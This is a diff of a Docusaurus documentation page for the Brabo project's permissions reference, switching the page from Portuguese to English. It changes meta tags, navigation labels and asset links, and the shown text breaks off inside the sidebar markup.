@@ -1,15 +1,15 @@
-<!doctype html><html lang=pt-BR dir=ltr class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-reference/permissions" data-has-hydrated=false><head><meta charset=UTF-8><meta name=generator content="Docusaurus v3.10.2"><title data-rh=true>Permissões | Brabo</title><meta data-rh=true name=viewport content="width=device-width, initial-scale=1.0"/><meta data-rh=true name=robots content="noindex, nofollow"/><meta data-rh=true name=twitter:card content=summary_large_image /><meta data-rh=true property=og:url content=https://daneiel.github.io/brabo/qa/reference/permissions /><meta data-rh=true property=og:locale content=pt_BR /><meta data-rh=true name=docusaurus_locale content=pt-BR /><meta data-rh=true name=docsearch:language content=pt-BR /><meta data-rh=true name=docusaurus_version content=current /><meta data-rh=true name=docusaurus_tag content=docs-default-current /><meta data-rh=true name=docsearch:version content=current /><meta data-rh=true name=docsearch:docusaurus_tag content=docs-default-current /><meta data-rh=true property=og:title content="Permissões | Brabo"/><meta data-rh=true name=description content="O formato do permissions.json, como um padrão casa com um comando, e a ordem exata em que a decisão é tomada."/><meta data-rh=true property=og:description content="O formato do permissions.json, como um padrão casa com um comando, e a ordem exata em que a decisão é tomada."/><meta data-rh=true name=keywords content=permissions.json,aprovação,política,deny,allow,proposed_action /><link data-rh=true rel=icon href=/brabo/qa/img/favicon.ico /><link data-rh=true rel=canonical href=https://daneiel.github.io/brabo/qa/reference/permissions /><link data-rh=true rel=alternate href=https://daneiel.github.io/brabo/qa/reference/permissions hreflang=pt-BR /><link data-rh=true rel=alternate href=https://daneiel.github.io/brabo/qa/reference/permissions hreflang=x-default /><script data-rh=true type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","item":"https://daneiel.github.io/brabo/qa/reference/permissions","name":"Permissões","position":1}]}</script><link rel=stylesheet href=/brabo/qa/assets/css/styles.bae5b9bf.css /><script src=/brabo/qa/assets/js/runtime~main.73f4045d.js defer></script><script src=/brabo/qa/assets/js/main.0ccf275a.js defer></script></head><body><svg style="display: none;"><defs>
+<!doctype html><html lang=en dir=ltr class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-reference/permissions" data-has-hydrated=false><head><meta charset=UTF-8><meta name=generator content="Docusaurus v3.10.2"><title data-rh=true>Permissions | Brabo</title><meta data-rh=true name=viewport content="width=device-width, initial-scale=1.0"/><meta data-rh=true name=robots content="noindex, nofollow"/><meta data-rh=true name=twitter:card content=summary_large_image /><meta data-rh=true property=og:url content=https://daneiel.github.io/brabo/qa/reference/permissions /><meta data-rh=true property=og:locale content=en /><meta data-rh=true property=og:locale:alternate content=pt_BR /><meta data-rh=true name=docusaurus_locale content=en /><meta data-rh=true name=docsearch:language content=en /><meta data-rh=true name=docusaurus_version content=current /><meta data-rh=true name=docusaurus_tag content=docs-default-current /><meta data-rh=true name=docsearch:version content=current /><meta data-rh=true name=docsearch:docusaurus_tag content=docs-default-current /><meta data-rh=true property=og:title content="Permissions | Brabo"/><meta data-rh=true name=description content="The format of permissions.json, how a pattern matches a command, and the exact order in which the decision is made."/><meta data-rh=true property=og:description content="The format of permissions.json, how a pattern matches a command, and the exact order in which the decision is made."/><meta data-rh=true name=keywords content=permissions.json,approval,policy,deny,allow,proposed_action /><link data-rh=true rel=icon href=/brabo/qa/img/favicon.ico /><link data-rh=true rel=canonical href=https://daneiel.github.io/brabo/qa/reference/permissions /><link data-rh=true rel=alternate href=https://daneiel.github.io/brabo/qa/reference/permissions hreflang=en /><link data-rh=true rel=alternate href=https://daneiel.github.io/brabo/qa/pt-BR/reference/permissions hreflang=pt-BR /><link data-rh=true rel=alternate href=https://daneiel.github.io/brabo/qa/reference/permissions hreflang=x-default /><script data-rh=true type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","item":"https://daneiel.github.io/brabo/qa/reference/permissions","name":"Permissions","position":1}]}</script><link rel=stylesheet href=/brabo/qa/assets/css/styles.bae5b9bf.css /><script src=/brabo/qa/assets/js/runtime~main.b911d2b3.js defer></script><script src=/brabo/qa/assets/js/main.d990c184.js defer></script></head><body><svg style="display: none;"><defs>
 <symbol id=theme-svg-external-link viewBox="0 0 24 24"><path fill=currentColor d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"/></symbol>
 </defs></svg>
-<script>!function(){var t=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme-6fd")}catch(t){}}();document.documentElement.setAttribute("data-theme",t||(window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light")),document.documentElement.setAttribute("data-theme-choice",t||"system")}(),function(){try{for(var[t,e]of new URLSearchParams(window.location.search).entries())if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id=__docusaurus><link rel=preload as=image href=/brabo/qa/img/logo.svg /><div role=region aria-label="Pular para o conteúdo principal"><a class=skipToContent_aRZD href=#__docusaurus_skipToContent_fallback>Pular para o conteúdo principal</a></div><nav aria-label="Navegação principal" class="theme-layout-navbar navbar navbar--fixed-top"><div class=navbar__inner><div class="theme-layout-navbar-left navbar__items"><button aria-label="Alternar painel de navegação" aria-expanded=false class="navbar__toggle clean-btn" type=button><svg width=30 height=30 viewBox="0 0 30 30" aria-hidden=true><path stroke=currentColor stroke-linecap=round stroke-miterlimit=10 stroke-width=2 d="M4 7h22M4 15h22M4 23h22"/></svg></button><a class=navbar__brand href=/brabo/qa/><div class=navbar__logo><img src=/brabo/qa/img/logo.svg alt=Brabo class="themedComponent_BSiW themedComponent--light_TNiM"/><img src=/brabo/qa/img/logo.svg alt=Brabo class="themedComponent_BSiW themedComponent--dark__fCd"/></div><b class="navbar__title text--truncate">Brabo</b></a><a aria-current=page class="navbar__item navbar__link navbar__link--active" href=/brabo/qa/>Documentação</a><a class="navbar__item navbar__link" href=/brabo/qa/runbook>Runbook</a><a class="navbar__item navbar__link" href=/brabo/qa/adr>ADRs</a></div><div class="theme-layout-navbar-right navbar__items navbar__items--right"><div class="navbar__item dropdown dropdown--hoverable dropdown--right"><a href=# aria-haspopup=true aria-expanded=false role=button class=navbar__link>qa</a><ul class=dropdown__menu><li><a href=https://daneiel.github.io/brabo/prd/ target=_blank rel="noopener noreferrer" class=dropdown__link>prd — estável<svg width=12 height=12 aria-label="(opens in new tab)" class=iconExternalLink_lgoI><use href=#theme-svg-external-link /></svg></a><li><a href=https://daneiel.github.io/brabo/qa/ target=_blank rel="noopener noreferrer" class=dropdown__link>qa — candidata ✓<svg width=12 height=12 aria-label="(opens in new tab)" class=iconExternalLink_lgoI><use href=#theme-svg-external-link /></svg></a><li><a href=https://daneiel.github.io/brabo/dev/ target=_blank rel="noopener noreferrer" class=dropdown__link>dev — em desenvolvimento<svg width=12 height=12 aria-label="(opens in new tab)" class=iconExternalLink_lgoI><use href=#theme-svg-external-link /></svg></a></ul></div><a href=https://github.com/daneiel/brabo target=_blank rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width=13.5 height=13.5 aria-label="(opens in new tab)" class=iconExternalLink_lgoI><use href=#theme-svg-external-link /></svg></a><div class="toggle_B7FD colorModeToggle_i51f"><button class="clean-btn toggleButton_iBXZ toggleButtonDisabled_g7aN" type=button disabled title="modo do sistema" aria-label="Mudar entre modo claro e escuro (modo do sistema está ativo)"><svg viewBox="0 0 24 24" width=24 height=24 aria-hidden=true class="toggleIcon_NE6f lightToggleIcon_IoAw"><path fill=currentColor d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"/></svg><svg viewBox="0 0 24 24" width=24 height=24 aria-hidden=true class="toggleIcon_NE6f darkToggleIcon_CFpV"><path fill=currentColor d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"/></svg><svg viewBox="0 0 24 24" width=24 height=24 aria-hidden=true class="toggleIcon_NE6f systemToggleIcon_FD32"><path fill=currentColor d="m12 21c4.971 0 9-4.029 9-9s-4.029-9-9-9-9 4.029-9 9 4.029 9 9 9zm4.95-13.95c1.313 1.313 2.05 3.093 2.05 4.95s-0.738 3.637-2.05 4.95c-1.313 1.313-3.093 2.05-4.95 2.05v-14c1.857 0 3.637 0.737 4.95 2.05z"/></svg></button></div><div class=navbarSearchContainer_H1qa><div class="navbar__search searchBarContainer_E7mJ" dir=ltr><input placeholder=Search aria-label=Search class="navbar__search-input searchInput_Fmbc" value="" /><div class="loadingRing_yYGt searchBarLoadingRing_TCpJ"><div></div><div></div><div></div><div></div></div></div></div></div></div><div role=presentation class=navbar-sidebar__backdrop></div></nav><div id=__docusaurus_skipToContent_fallback class="theme-layout-main main-wrapper mainWrapper_sSUF"><div class=docsWrapper__5pg><button aria-label="Voltar para o topo" class="clean-btn theme-back-to-top-button backToTopButton_woZa" type=button></button><div class=docRoot_jND2><aside class="theme-doc-sidebar-container docSidebarContainer_tVYW"><div class=sidebarViewport_gVXc><div class=sidebar_vRsD><nav aria-label="Painel lateral de documentos" class="menu thin-scrollbar menu_IacH"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class=menu__list-item-collapsible><a class="categoryLink_IUOB menu__link menu__link--sublist menu__link--sublist-caret" role=button aria-expanded=true href=/brabo/qa/><span class=categoryLinkLabel_U9or>🚀 Comece aqui</span></a></div><ul class=menu__list><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/qa/><span class=linkLabel_pWVb>Introdução</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/qa/getting-started><span class=linkLabel_pWVb>Primeiros passos</span></a></ul><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class=menu__list-item-collapsible><a class="categoryLink_IUOB menu__link menu__link--sublist menu__link--sublist-caret" role=button aria-expanded=true href=/brabo/qa/architecture><span class=categoryLinkLabel_U9or>🏗️ Arquitetura</span></a></div><ul class=menu__list><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/qa/architecture><span class=linkLabel_pWVb>Arquitetura</span></a><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class=menu__list-item-collapsible><a class="categoryLink_IUOB menu__link menu__link--sublist" tabindex=0 href=/brabo/qa/adr><span class=categoryLinkLabel_U9or>Decisões (ADR)</span></a><button aria-label="Expandir a categoria 'Decisões (ADR)'" aria-expanded=false type=button class="clean-btn menu__caret"></button></div></ul><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class=menu__list-item-collapsible><a class="categoryLink_IUOB menu__link menu__link--sublist menu__link--sublist-caret" role=button aria-expanded=true href=/brabo/qa/business-rules><span class=categoryLinkLabel_U9or>📐 Regras</span></a></div><ul class=menu__list><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/qa/business-rules><span class=linkLabel_pWVb>Regras de negócio</span></a></ul><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class=menu__list-item-collapsible><a class="categoryLink_IUOB menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" role=button aria-expanded=true href=/brabo/qa/reference/configuration><span class=categoryLinkLabel_U9or>📖 Referência</span></a></div><ul class=menu__list><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/qa/reference/configuration><span class=linkLabel_pWVb>Configuração</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/qa/reference/events><span class=linkLabel_pWVb>Eventos</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link menu__link--active" aria-current=page tabindex=0 href=/brabo/qa/reference/permissions><span class=linkLabel_pWVb>Permissões</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/qa/reference/artifacts><span class=linkLabel_pWVb>Artefatos</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/qa/reference/git-providers><span class=linkLabel_pWVb>Providers de git</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/qa/reference/internal-api><span class=linkLabel_pWVb>API interna</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/qa/reference/scripts><span class=linkLabel_pWVb>Scripts</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/qa/reference/rulesets><span class=linkLabel_pWVb>Rulesets</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/qa/security-surface><span class=linkLabel_pWVb>Superfície exposta da api</span></a><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class=menu__list-item-collapsible><a class="categoryLink_IUOB menu__link menu__link--sublist menu__link--sublist-caret" role=button aria-expanded=false tabindex=0 href=/brabo/qa/reference/api/brabo-api><span class=categoryLinkLabel_U9or>Referência da API</span></a></div></ul><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class=menu__list-item-collapsible><a class="categoryLink_IUOB menu__link menu__link--sublist menu__link--sublist-caret" role=button aria-expanded=true href=/brabo/qa/explanation/documentation-workflow><span class=categoryLinkLabel_U9or>💡 Explicação</span></a></div><ul class=menu__list><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/qa/explanation/documentation-workflow><span class=linkLabel_pWVb>Sincronização de docs</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/qa/explanation/branching-policy><span class=linkLabel_pWVb>Política de branches</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/qa/explanation/observability><span class=linkLabel_pWVb>Observabilidade</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/qa/explanation/primeiro-dogfooding><span class=linkLabel_pWVb>Primeiro dogfooding</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/qa/explanation/execucao-real-hello-world><span class=linkLabel_pWVb>Execução real (hello world)</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/qa/explanation/achados-execucao-real><span class=linkLabel_pWVb>Achados da execução real da esteira</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/qa/explanation/backlog><span class=linkLabel_pWVb>Backlog triado</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/qa/explanation/validacao-fase-12><span class=linkLabel_pWVb>Validação da Fase 12</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/qa/explanation/validacao-real><span class=linkLabel_pWVb>Validação real (13b)</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/qa/explanation/aceite-providers><span class=linkLabel_pWVb>Aceite dos providers</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/qa/explanation/gates><span class=linkLabel_pWVb>Os gates, e como eles são medidos</span></a></ul><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class=menu__list-item-collapsible><a class="categoryLink_IUOB menu__link menu__link--sublist menu__link--sublist-caret" role=button aria-expanded=true href=/brabo/qa/runbook><span class=categoryLinkLabel_U9or>🛠️ Operação</span></a></div><ul class=menu__list><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/qa/runbook><span class=linkLabel_pWVb>Runbook</span></a></ul><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class=menu__list-item-collapsible><a class="categoryLink_IUOB menu__link menu__link--sublist menu__link--sublist-caret" role=button aria-expanded=true href=/brabo/qa/glossary><span class=categoryLinkLabel_U9or>📚 Vocabulário</span></a></div><ul class=menu__list><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/qa/glossary><span class=linkLabel_pWVb>Glossário</span></a></ul><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class=menu__list-item-collapsible><a href=https://github.com/daneiel/brabo/blob/dev/CONTRIBUTING.md target=_blank rel="noopener noreferrer" class="categoryLink_IUOB menu__link menu__link--sublist menu__link--sublist-caret" role=button aria-expanded=true><span class=categoryLinkLabel_U9or>🤝 Contribuir</span></a></div><ul class=menu__list><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a href=https://github.com/daneiel/brabo/blob/dev/CONTRIBUTING.md target=_blank rel="noopener noreferrer" class="menu__link menuExternalLink_HSqD" tabindex=0><span class=linkLabel_pWVb>Como contribuir</span><svg width=13.5 height=13.5 aria-label="(opens in new tab)" class=iconExternalLink_lgoI><use href=#theme-svg-external-link /></svg></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a href=https://github.com/daneiel/brabo/blob/dev/SUPPORT.md target=_blank rel="noopener noreferrer" class="menu__link menuExternalLink_HSqD" tabindex=0><span class=linkLabel_pWVb>Onde pedir ajuda</span><svg width=13.5 height=13.5 aria-label="(opens in new tab)" class=iconExternalLink_lgoI><use href=#theme-svg-external-link /></svg></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a href=https://github.com/daneiel/brabo/blob/dev/SECURITY.md target=_blank rel="noopener noreferrer" class="menu__link menuExternalLink_HSqD" tabindex=0><span class=linkLabel_pWVb>Reportar vulnerabilidade</span><svg width=13.5 height=13.5 aria-label="(opens in new tab)" class=iconExternalLink_lgoI><use href=#theme-svg-external-link /></svg></a></ul></ul></nav></div></div></aside><main class=docMainContainer_SmZv><div class="container padding-top--md padding-bottom--lg"><div class=row><div class="col docItemCol_XH1Q"><div class=docItemContainer_uk13><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_g2_L" aria-label=Trilha><ul class=breadcrumbs><li class=breadcrumbs__item><a aria-label="Página Inicial" class=breadcrumbs__link href=/brabo/qa/><svg viewBox="0 0 24 24" class=breadcrumbHomeIcon_ILC1><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill=currentColor /></svg></a><li class=breadcrumbs__item><span class=breadcrumbs__link>📖 Referência</span><li class="breadcrumbs__item breadcrumbs__item--active"><span class=breadcrumbs__link>Permissões</span></ul></nav><div class="tocCollapsible_sC5p theme-doc-toc-mobile tocMobile_jNpd"><button type=button class="clean-btn tocCollapsibleButton_sMs7">Nesta página</button></div><div class="theme-doc-markdown markdown"><div class=row><div class="col col--12 markdown"><header><h1>Permissões</h1></header>
-<p>Toda ação com efeito externo nasce como <code>proposed_action</code> e passa por aqui
-antes de executar. Esta página é o formato e a semântica exata — as regras em
-si estão em <a class="" href=/brabo/qa/business-rules#rn-004>Regras de negócio</a>.</p>
-<h2 class="anchor anchorTargetStickyNavbar_URsz" id=o-arquivo>O arquivo<a href=#o-arquivo class=hash-link aria-label="Link direto para O arquivo" title="Link direto para O arquivo" translate=no>​</a></h2>
-<p><code>permissions.json</code> fica na <strong>raiz do workspace do projeto</strong> — é um arquivo de
-verdade no disco, versionável, não uma coluna no banco.</p>
+<script>!function(){var t=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme-6fd")}catch(t){}}();document.documentElement.setAttribute("data-theme",t||(window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light")),document.documentElement.setAttribute("data-theme-choice",t||"system")}(),function(){try{for(var[t,e]of new URLSearchParams(window.location.search).entries())if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id=__docusaurus><link rel=preload as=image href=/brabo/qa/img/logo.svg /><div role=region aria-label="Skip to main content"><a class=skipToContent_aRZD href=#__docusaurus_skipToContent_fallback>Skip to main content</a></div><nav aria-label=Main class="theme-layout-navbar navbar navbar--fixed-top"><div class=navbar__inner><div class="theme-layout-navbar-left navbar__items"><button aria-label="Toggle navigation bar" aria-expanded=false class="navbar__toggle clean-btn" type=button><svg width=30 height=30 viewBox="0 0 30 30" aria-hidden=true><path stroke=currentColor stroke-linecap=round stroke-miterlimit=10 stroke-width=2 d="M4 7h22M4 15h22M4 23h22"/></svg></button><a class=navbar__brand href=/brabo/qa/><div class=navbar__logo><img src=/brabo/qa/img/logo.svg alt=Brabo class="themedComponent_BSiW themedComponent--light_TNiM"/><img src=/brabo/qa/img/logo.svg alt=Brabo class="themedComponent_BSiW themedComponent--dark__fCd"/></div><b class="navbar__title text--truncate">Brabo</b></a><a aria-current=page class="navbar__item navbar__link navbar__link--active" href=/brabo/qa/>Documentação</a><a class="navbar__item navbar__link" href=/brabo/qa/runbook>Runbook</a><a class="navbar__item navbar__link" href=/brabo/qa/adr>ADRs</a></div><div class="theme-layout-navbar-right navbar__items navbar__items--right"><div class="navbar__item dropdown dropdown--hoverable dropdown--right"><a href=# aria-haspopup=true aria-expanded=false role=button class=navbar__link>qa</a><ul class=dropdown__menu><li><a href=https://daneiel.github.io/brabo/prd/ target=_blank rel="noopener noreferrer" class=dropdown__link>prd — estável<svg width=12 height=12 aria-label="(opens in new tab)" class=iconExternalLink_lgoI><use href=#theme-svg-external-link /></svg></a><li><a href=https://daneiel.github.io/brabo/qa/ target=_blank rel="noopener noreferrer" class=dropdown__link>qa — candidata ✓<svg width=12 height=12 aria-label="(opens in new tab)" class=iconExternalLink_lgoI><use href=#theme-svg-external-link /></svg></a><li><a href=https://daneiel.github.io/brabo/dev/ target=_blank rel="noopener noreferrer" class=dropdown__link>dev — em desenvolvimento<svg width=12 height=12 aria-label="(opens in new tab)" class=iconExternalLink_lgoI><use href=#theme-svg-external-link /></svg></a></ul></div><a href=https://github.com/daneiel/brabo target=_blank rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width=13.5 height=13.5 aria-label="(opens in new tab)" class=iconExternalLink_lgoI><use href=#theme-svg-external-link /></svg></a><div class="toggle_B7FD colorModeToggle_i51f"><button class="clean-btn toggleButton_iBXZ toggleButtonDisabled_g7aN" type=button disabled title="system mode" aria-label="Switch between dark and light mode (currently system mode)"><svg viewBox="0 0 24 24" width=24 height=24 aria-hidden=true class="toggleIcon_NE6f lightToggleIcon_IoAw"><path fill=currentColor d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"/></svg><svg viewBox="0 0 24 24" width=24 height=24 aria-hidden=true class="toggleIcon_NE6f darkToggleIcon_CFpV"><path fill=currentColor d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"/></svg><svg viewBox="0 0 24 24" width=24 height=24 aria-hidden=true class="toggleIcon_NE6f systemToggleIcon_FD32"><path fill=currentColor d="m12 21c4.971 0 9-4.029 9-9s-4.029-9-9-9-9 4.029-9 9 4.029 9 9 9zm4.95-13.95c1.313 1.313 2.05 3.093 2.05 4.95s-0.738 3.637-2.05 4.95c-1.313 1.313-3.093 2.05-4.95 2.05v-14c1.857 0 3.637 0.737 4.95 2.05z"/></svg></button></div><div class=navbarSearchContainer_H1qa><div class="navbar__search searchBarContainer_E7mJ" dir=ltr><input placeholder=Search aria-label=Search class="navbar__search-input searchInput_Fmbc" value="" /><div class="loadingRing_yYGt searchBarLoadingRing_TCpJ"><div></div><div></div><div></div><div></div></div></div></div></div></div><div role=presentation class=navbar-sidebar__backdrop></div></nav><div id=__docusaurus_skipToContent_fallback class="theme-layout-main main-wrapper mainWrapper_sSUF"><div class=docsWrapper__5pg><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_woZa" type=button></button><div class=docRoot_jND2><aside class="theme-doc-sidebar-container docSidebarContainer_tVYW"><div class=sidebarViewport_gVXc><div class=sidebar_vRsD><nav 